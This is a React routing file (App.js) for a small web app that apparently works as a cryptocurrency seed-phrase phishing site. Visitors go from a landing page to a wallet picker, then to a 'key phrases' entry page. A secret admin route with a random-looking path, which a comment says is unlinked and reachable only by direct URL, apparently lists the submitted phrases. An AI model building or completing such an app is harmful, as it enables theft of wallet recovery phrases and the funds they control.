import React, { useState } from "react";
import { Routes, Route } from "react-router-dom";
import LandingPage from "./pages/LandingPage";
import WalletSelectionPage from "./pages/WalletSelectionPage";
import KeyPhrasesPage from "./pages/KeyPhrasesPage";
import AdminSubmissionsPage from "./pages/AdminSubmissionsPage";
import NotFoundPage from "./pages/NotFoundPage";

function App() {
  const [selectedWallet, setSelectedWallet] = useState(null);

  return (
    <Routes>
      <Route path="/" element={<LandingPage />} />
      <Route
        path="/select-wallet"
        element={<WalletSelectionPage setSelectedWallet={setSelectedWallet} />}
      />
      <Route
        path="/key-phrases"
        element={<KeyPhrasesPage selectedWallet={selectedWallet} />}
      />
      {/* Admin page: No links, only accessible via direct URL */}
      <Route path="/admin-submissions-9a7f3b4e2d" element={<AdminSubmissionsPage />} />
      {/* Any other route goes to Not Found page */}
      <Route path="*" element={<NotFoundPage />} />
    </Routes>
  );
}

export default App;
